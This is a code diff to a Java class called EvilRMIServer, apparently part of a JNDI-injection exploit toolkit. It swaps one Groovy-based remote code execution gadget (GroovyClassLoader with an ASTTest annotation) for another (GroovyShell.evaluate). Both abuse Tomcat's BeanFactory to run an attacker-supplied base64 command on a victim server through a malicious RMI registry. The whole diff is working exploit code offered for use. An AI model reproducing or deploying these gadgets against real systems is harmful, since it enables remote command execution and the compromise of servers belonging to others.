@@ -34,13 +34,10 @@ public class EvilRMIServer {
     /*
      * Need : Tomcat and groovy in classpath.
      */
-    public ReferenceWrapper execByGroovyParse() throws RemoteException, NamingException{
-        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
-        ref.add(new StringRefAddr("forceString", "x=parseClass"));
-        String script = String.format("@groovy.transform.ASTTest(value={\n" +
-                "    assert java.lang.Runtime.getRuntime().exec(\"%s\")\n" +
-                "})\n" +
-                "def x\n", commandGenerator.getBase64CommandTpl());
+    public ReferenceWrapper execByGroovy() throws RemoteException, NamingException{
+        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+        ref.add(new StringRefAddr("forceString", "x=evaluate"));
+        String script = String.format("'%s'.execute()", commandGenerator.getBase64CommandTpl());
         ref.add(new StringRefAddr("x",script));
         return new ReferenceWrapper(ref);
     }
@@ -61,6 +58,6 @@ public class EvilRMIServer {
         System.setProperty("java.rmi.server.hostname",ip);
 
         registry.bind("ExecByEL",evilRMIServer.execByEL());
-        registry.bind("ExecByGroovyParse",evilRMIServer.execByGroovyParse());
+        registry.bind("ExecByGroovy",evilRMIServer.execByGroovy());
     }
 }
